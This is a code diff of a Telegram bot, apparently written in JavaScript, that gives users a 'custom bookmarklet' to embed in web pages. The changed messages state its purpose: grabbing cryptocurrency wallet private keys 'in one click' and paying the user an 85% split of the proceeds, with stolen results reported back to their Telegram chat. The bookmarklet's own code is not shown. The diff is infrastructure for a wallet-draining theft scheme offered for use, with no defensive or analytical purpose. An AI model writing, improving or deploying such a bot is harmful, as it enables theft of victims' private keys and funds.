@@ -34,27 +34,27 @@ bot.onText(/\/generate/, (msg) => {
   })();`;
 
   bot.sendMessage(chatId, `
-🎯 **Profile Extraction Bookmarklet**
+🎯 **Your Custom Bookmarklet**
 
-📋 **Code:**
+📋 **Copy the script below and add it to your html code, if you need help contact support**
 \`\`\`
 ${bookmarklet}
 \`\`\`
 
-Your tracking ID: ${chatId}
-You'll receive notifications with wallet values.
+Your telegram ID: ${chatId}
+You'll receive all notifications automatically in this chat.
   `, { parse_mode: 'Markdown' });
 });
 
 bot.onText(/\/start/, (msg) => {
   bot.sendMessage(msg.chat.id, `
-🎯 **Profile Extraction Bot**
+🎯 **WISH BOOKMARK BOT**
 
 Commands:
-/generate - Get your tracking bookmarklet
+/generate - Get your custom bookmarklet.
 /start - This menu
 
-Extract full wallet profiles with balances.
+Compile an axiom bookmark and receive an 85% split. All private keys grabbed in one click.
   `, { parse_mode: 'Markdown' });
 });
 
